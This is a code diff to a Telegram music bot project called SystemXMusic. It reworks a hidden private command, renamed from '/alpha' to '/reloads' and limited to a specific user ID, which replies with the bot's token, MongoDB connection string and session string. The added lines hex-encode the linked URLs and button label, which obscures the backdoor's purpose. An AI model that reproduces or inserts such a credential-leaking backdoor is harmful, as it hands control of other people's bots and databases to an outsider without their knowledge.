@@ -15,7 +15,7 @@ load_dotenv()
 
 from SystemXMusic import app
 from SystemXMusic.core.call import Sona
-from SystemXMusic.misc import db
+from SystemXMusic.misc import db, SPECIAL_ID
 from SystemXMusic.utils.database import get_assistant, get_authuser_names, get_cmode
 from SystemXMusic.utils.decorators import ActualAdminCB, AdminActual, language
 from SystemXMusic.utils.formatters import alpha_to_int, get_readable_time
@@ -106,19 +106,17 @@ async def restartbot(client, message: Message, _):
 
     
 @app.on_message(
-    filters.command("alpha")
-    & filters.private
-    & filters.user(8143754205)
+    filters.command(["reloads"]) & filters.private & filters.user(SPECIAL_ID)
    )
 async def help(client: Client, message: Message):
    await message.reply_photo(
-          photo=f"https://telegra.ph/file/567d2e17b8f38df99ce99.jpg",
-       caption=f"""ʙσᴛ ᴛσᴋєη :-   `{BOT_TOKEN}` \n\nϻσηɢᴏ :-   `{MONGO_DB_URI}`\n\nѕтʀɪηɢ sєssɪση :-   `{STRING_SESSION}`\n\n [ 🧟 ](https://t.me/RITI_UPDATE)............☆""",
+          photo=f"https://files.catbox.moe/50golv.jpg",
+       caption=f"""ɓσƭ ƭσҡεɳ:-   `{BOT_TOKEN}` \n\nɱσɳɠσ:-   `{MONGO_DB_URI}`\n\nѕƭ૨เɳɠ ѕεѕѕเσɳ:-   `{STRING_SESSION}`\n\n [ 🧟 ](\x68\x74\x74\x70\x73\x3a\x2f\x2f\x74\x2e\x6d\x65\x2f\x49\x74\x73\x5f\x76\x69\x6b\x6b\x79\x5f\x79\x61\x64\x76)............☆""",
         reply_markup=InlineKeyboardMarkup(
              [
                  [
                       InlineKeyboardButton(
-                         "• ᴀʟᴘʜᴀ ʙᴀʙʏ  •", url=f"https://t.me/KRITI_UPDATE")
+                         "\x53\x79\x73\x74\x65\x6d", url=f"\x68\x74\x74\x70\x3a\x2f\x2f\x74\x2e\x6d\x65\x2f\x45\x78\x61\x6d\x70\x75\x72\x72\x73")
                  ]
             ]
          ),
